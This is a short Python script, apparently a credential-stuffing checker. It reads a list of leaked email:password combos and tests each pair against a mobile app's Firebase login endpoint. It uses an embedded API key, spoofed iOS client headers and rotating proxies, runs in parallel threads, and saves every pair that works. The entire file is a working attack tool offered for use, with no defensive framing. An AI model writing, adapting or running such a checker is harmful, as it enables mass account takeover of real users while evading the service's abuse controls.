from lib import request, parse, loader
from random import choice
from concurrent import futures


loader.load_combo('amine.txt')
loader.load_proxies('https')

def check(email, password):
   proxy = choice(loader.proxies)
   data = {"email":f"{email}","returnSecureToken":True,"password":f"{password}"}
   headers = {"Content-Type": "application/json","Host": "www.googleapis.com","User-Agent": "FirebaseAuth.iOS/7.3.0 com.wdwaxeneoboard.com/1.2.1 iPhone/14.2 hw/iPhone10_4","X-Client-Version": "iOS/FirebaseSDK/7.3.0/FirebaseCore-iOS","X-Ios-Bundle-Identifier": "com.wdwaxeneoboard.com",}
   # Start 
   block = request.get_response('POST', 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCNXXqtUeO3-VtoNgChiNFkFE2kqy5SRsI', json=data, headers=headers, proxies=proxy, timeout=10)
   
   block.fail(statement='error')
   block.success(statement=f'{email}', save_this=f'{email}:{password}')
   
   request.result()
   # End

futures.ThreadPoolExecutor().map(check, loader.users, loader.passwords)
